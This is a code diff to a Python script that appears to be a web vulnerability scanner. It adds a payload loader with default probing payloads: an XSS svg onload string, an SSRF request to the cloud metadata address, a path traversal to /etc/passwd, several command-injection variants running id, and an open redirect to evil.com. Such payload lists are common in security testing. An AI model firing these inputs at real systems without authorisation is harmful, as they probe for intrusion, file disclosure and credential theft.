@@ -11,6 +11,28 @@ import urllib3
 urllib3.disable_warnings()
 
 init(autoreset=True)
+PAYLOAD_PATHS = {
+    "xss": "XSS-Payloads",
+    "ssrf": "SSRF-Payloads",
+    "lfi": "LFI-Payloads",
+    "rce": "RCE-Payloads",          # only if you create this file!
+    "redirect": "Redirect-Payloads" # only if you create this file!
+}
+DEFAULT_PAYLOADS = {
+    "xss": ['"><svg/onload=alert(1)>'],
+    "ssrf": ["http://169.254.169.254/latest/meta-data/"],
+    "lfi": ["../../../../etc/passwd"],
+    "rce": [";id", "|id", "&&id", "`id`", "$(id)", "||id"],
+    "redirect": ["https://evil.com"]
+}
+def load_payloads(vulntype):
+    path = PAYLOAD_PATHS.get(vulntype)
+    if path and os.path.exists(path):
+        with open(path) as f:
+            payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+            if payloads:
+                return payloads
+    return DEFAULT_PAYLOADS[vulntype]
 
 BANNER = f"""{Fore.LIGHTCYAN_EX}
    ▄████▄   ▒█████   ▄▄▄▄    ▒█████   ██▀███   ▄▄▄█████▓ ▒█████   ███▄    █ 
